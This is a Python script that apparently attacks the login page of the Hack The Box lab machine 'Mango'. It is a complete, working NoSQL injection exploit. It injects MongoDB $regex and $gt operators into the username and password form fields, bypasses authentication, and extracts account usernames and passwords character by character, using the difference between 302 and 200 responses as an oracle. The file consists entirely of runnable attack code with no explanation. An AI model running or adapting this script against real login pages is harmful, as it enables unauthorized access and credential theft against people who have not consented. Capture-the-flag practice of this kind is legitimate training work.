#!/usr/bin/python

import requests
import string
from sys import stdout

url = "http://staging-order.mango.htb/index.php"

username = ""
password = ""

print("Finding number of username characters")

for i in range(0,10,1):
    post_data = {'username[$regex]':'.{'+str(i)+'}', 'password[$gt]': '','login':'login'}
    res = requests.post(url,data=post_data, allow_redirects=False)
    if res.status_code == 200:
        print "Username has {} characters".format(i-1)
        username_length = i-1
        break

print("Username Is:")
while True:
    for p in string.ascii_letters + string.digits:
        payload = username + p + '.{' + str(username_length - len(username) - 1) + '}'
        post_data = {'username[$regex]':payload, 'password[$gt]': '','login':'login'}
        res = requests.post(url,data=post_data, allow_redirects=False)
        if res.status_code == 302:
            username += p
            stdout.write("\r%s" % username)
            stdout.flush()
            break
    if len(username) == username_length:
        break

print "\nFinding number of password characters"
for i in range(0,20,1):
    post_data = {'username':username, 'password[$regex]': '.{'+str(i)+'}','login':'login'}
    res = requests.post(url,data=post_data, allow_redirects=False)
    if res.status_code == 200:
        print "password has {} characters".format(i-1)
        password_length = i-1
        break

print("\n")

print("Password Is:")
while True:
    for p in string.ascii_letters + string.digits + "`~!@#$%^&()_=-{}][;,/<:'\"":
        payload = password + p + '.{' + str(password_length - len(password) - 1) + '}'
        post_data = {'username':username, 'password[$regex]':payload,'login':'login'}
        res = requests.post(url,data=post_data, allow_redirects=False)
        if res.status_code == 302:
            password += p
            stdout.write("\r%s" % password)
            stdout.flush()
            break
    if len(password) == password_length:
        break

print("\n")

username = ""
password = ""

print "\nFinding number of password characters"
for i in range(0,20,1):
    post_data = {'username[$gt]':'', 'password[$regex]': '.{'+str(i)+'}','login':'login'}
    res = requests.post(url,data=post_data, allow_redirects=False)
    if res.status_code == 200:
        print "password has {} characters".format(i-1)
        password_length = i-1
        break

print("\n")

print("Password Is:")
while True:
    for p in string.ascii_letters + string.digits + "`~!@#$%^&()_=-{}][;,/<:'\"":
        payload = password + p + '.{' + str(password_length - len(password) - 1) + '}'
        post_data = {'username[$gt]':'', 'password[$regex]':payload,'login':'login'}
        res = requests.post(url,data=post_data, allow_redirects=False)
        if res.status_code == 302:
            password += p
            stdout.write("\r%s" % password)
            stdout.flush()
            break
    if len(password) == password_length:
        break

print("\n")

print("Finding number of username characters")

for i in range(0,15,1):
    post_data = {'username[$regex]':'.{'+str(i)+'}', 'password': password,'login':'login'}
    res = requests.post(url,data=post_data, allow_redirects=False)
    if res.status_code == 200:
        print "Username has {} characters".format(i-1)
        username_length = i-1
        break

print("Username Is:")
while True:
    for p in string.ascii_letters + string.digits:
        payload = username + p + '.{' + str(username_length - len(username) - 1) + '}'
        post_data = {'username[$regex]':payload, 'password': password,'login':'login'}
        res = requests.post(url,data=post_data, allow_redirects=False)
        if res.status_code == 302:
            username += p
            stdout.write("\r%s" % username)
            stdout.flush()
            break
    if len(username) == username_length:
        break

print("\n")
